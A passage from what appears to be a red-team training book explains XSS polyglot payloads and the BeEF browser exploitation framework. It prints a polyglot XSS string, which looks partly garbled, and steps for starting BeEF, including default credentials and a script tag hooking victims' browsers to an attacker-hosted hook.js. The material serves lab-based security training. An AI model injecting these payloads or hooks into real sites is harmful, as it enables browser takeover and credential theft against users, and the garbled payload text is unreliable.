  md: "This type of payload is called a Polygl. A Polygl payload takes many different\
    \ types of payload/obfuscation techniques and compiles them into one attack. This\
    \ is great for automated scripts to lock XSS, bug bounty hunters with limited\
    \ time, or just a quick way to find input validation issues.\n\nSo, instead of\
    \ the normal <script>alert(1)</script>, we can build a Polygl like this (http://bit.ly/2GXxqH):\n\
    - /***//**/*/* /OniClk=alert()\n//%60D%0A%0d%0a%/*stYle/</title><scTeXaraA</scriptRift//\n\
    !>x3csVg/sgOnloAd=alert(/>)x3e\n\nIf you look at the payload above, attack tries\
    \ to break out of comments, ticks and slashes; perform an onload XSS; create multiple\
    \ tags; and lastly an onload XSS. These types of attacks make Polyglots extremely\
    \ effective and efficient at identifying XSS. You can read more about these Polyglot\
    \ XSSs here: https://github.com/0oxby/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot\n\
    \nIf you want to test and play around with the different polyglots, you can start\
    \ here on the vulnerable XSS pages (http://chat:3000/xss) or throughout the Chat\
    \ Application.\n\n# BeEF\n\nBrowser Exploitation Framework (http://beefproject.com/)\
    \ or BeEF, takes XSS to another level. This tool injects a JavaScript payload\
    \ onto the victim's browser, which infects the victim's system. This creates a\
    \ C2 channel on the victim's browser for JavaScript post-exploitation.\n\nFrom\
    \ a Red Team perspective, BeEF is a great tool to use on campaigns, track users,\
    \ capture credentials, perform clickjacking, attack with tabnapping and more.\
    \ If not used during an attack, BeEF is a great tool to demonstrate the power\
    \ of an XSS vulnerability. This could assist in more complicated attacks as well,\
    \ which we will discuss later in the book under Blind XSS.\n\nBeEF is broken down\
    \ into two parts: one is the server and the other is the attack payload. To start\
    \ the server:\n\nStart BeEF on Your Attacker Kali Host\n\n+   - From a Terminal\n\
    \  - beef-xss\n- Authenticate with beef:beef\n- View http://127.0.0.1:3000/hook.js\n\
    - Full Payload Hook File:\n  - <script src=\"http://Your IP>:3000/hook.js\"></script>"
